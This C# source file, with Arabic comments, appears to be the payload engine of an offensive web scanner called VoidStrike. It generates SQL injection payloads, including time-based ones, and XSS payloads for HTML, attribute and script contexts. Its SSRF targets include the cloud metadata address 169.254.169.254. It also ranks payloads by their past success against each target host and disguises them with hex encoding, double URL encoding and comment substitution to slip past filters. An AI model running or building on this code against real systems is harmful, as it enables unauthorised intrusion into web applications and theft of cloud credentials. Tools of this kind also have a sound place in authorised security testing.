using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace VoidStrike.Services
{
    public class MutationEngine
    {
        private static readonly Random _random = new Random();

        // نظام ذاكرة ذكي لحفظ نجاح الـ Payloads لكل هدف
        private static readonly ConcurrentDictionary<string, int> _payloadIntelligence = new();

        public enum PayloadContext { HTML, JSON, Attribute, Javascript, XML, Header }

        public static List<string> GenerateAdaptivePayloads(string type, PayloadContext context, string targetHost)
        {
            var basePayloads = type switch
            {
                "SQL" => GenerateSqlAdaptive(context),
                "XSS" => GenerateXssAdaptive(context),
                "SSRF" => new List<string> {
                    "http://169.254.169.254/latest/meta-data/",
                    "http://instance-data/latest/meta-data/",
                    "http://127.0.0.1:80",
                    "http://localhost:22"
                },
                _ => new List<string> { "voidstrike_test" }
            };

            // ترتيب الـ Payloads بناءً على "الذكاء الجمعي" المكتسب
            return basePayloads
                .OrderByDescending(p => _payloadIntelligence.GetValueOrDefault($"{targetHost}_{p}", 0))
                .ToList();
        }

        private static List<string> GenerateSqlAdaptive(PayloadContext context)
        {
            var payloads = new List<string> {
                "' OR '1'='1",
                "admin'--",
                "')) OR 1=1--",
                "'; WAITFOR DELAY '0:0:5'--",
                "1' AND SLEEP(5)--",
                "1\" OR \"1\"=\"1"
            };

            if (context == PayloadContext.JSON)
                return payloads.Select(p => p.Replace("'", "\\\"")).ToList();

            return payloads;
        }

        private static List<string> GenerateXssAdaptive(PayloadContext context)
        {
            return context switch
            {
                PayloadContext.Attribute => new List<string> { "\" onmouseover=\"alert(1)\"", "' onfocus='confirm(1)'", "javascript:alert(1)" },
                PayloadContext.Javascript => new List<string> { "';alert(1)//", "\"-alert(1)-\"", "void(0);-alert(1)" },
                _ => new List<string> { "<svg/onload=alert(1)>", "<img src=x onerror=prompt(1)>", "<details open ontoggle=alert(1)>" }
            };
        }

        public static void LearnFromSuccess(string host, string payload)
        {
            string key = $"{host}_{payload}";
            _payloadIntelligence.AddOrUpdate(key, 1, (k, v) => v + 1);
        }

        public static string MutatePayload(string input)
        {
            if (string.IsNullOrEmpty(input)) return "voidstrike_test";

            // التمويه الذكي (Traffic Shaping)
            int mode = _random.Next(0, 4);
            return mode switch
            {
                1 => HexEncode(input),
                2 => DoubleUrlEncode(input),
                3 => input.Replace(" ", "/**/"), // SQL Bypass
                _ => input
            };
        }

        private static string HexEncode(string input) => string.Join("", input.Select(c => $"%{(int)c:X2}"));
        private static string DoubleUrlEncode(string input) => Uri.EscapeDataString(Uri.EscapeDataString(input));
    }
}
